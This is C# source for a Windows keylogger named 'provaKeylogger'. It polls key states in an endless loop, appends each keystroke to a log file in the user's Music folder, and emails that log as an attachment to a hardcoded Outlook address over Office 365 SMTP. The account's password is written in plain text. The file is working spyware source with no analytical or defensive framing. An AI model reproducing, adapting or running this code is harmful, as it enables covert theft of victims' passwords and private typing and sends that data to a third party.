using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;


namespace provaKeylogger
{
    class Program
    {
        private static int i;

        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);
       
        static void Main(string[] args)
        {
            Random rand = new Random();
            int randomnumber = rand.Next(1, 21);
            if (20 == 20)
            {
                SendMail();
            }
            LogKeys();
            
          
        }
        static void SendMail()
        {
            String Newfilepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string Newfilepath2 = Newfilepath + @"\LogsFolder\LoggedKeys.text"; 

            DateTime dateTime = DateTime.Now;  
            string subtext = "Loggedfiles"; 
            subtext += dateTime;

            SmtpClient client = new SmtpClient("smtp.office365.com", 587); 
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("provakeylogger9@outlook.it"); 
            LOGMESSAGE.To.Add("provakeylogger9@outlook.it");
            LOGMESSAGE.Subject = subtext; 

            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("provakeylogger9@outlook.it", "Keylogger!");
                                                                      

            string newfile = File.ReadAllText(Newfilepath2);  
            System.Threading.Thread.Sleep(2);
            string attachmenttextfile = Newfilepath + @"\LogsFolder\attachmenttextfile.text"; 
            File.WriteAllText(attachmenttextfile, newfile);  
            System.Threading.Thread.Sleep(2);
            LOGMESSAGE.Attachments.Add(new Attachment(Newfilepath2)); 
            LOGMESSAGE.Body = subtext; 
            client.Send(LOGMESSAGE); 
            LOGMESSAGE = null;  
            
            
        }
        static void LogKeys()
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\LogsFolder\";

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (@filepath + "LoggedKeys.text");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (5 > 1)
            {

                Thread.Sleep(5);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);
                    
                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                        break;

                    }

                }

            }

        }

    }
        }
    

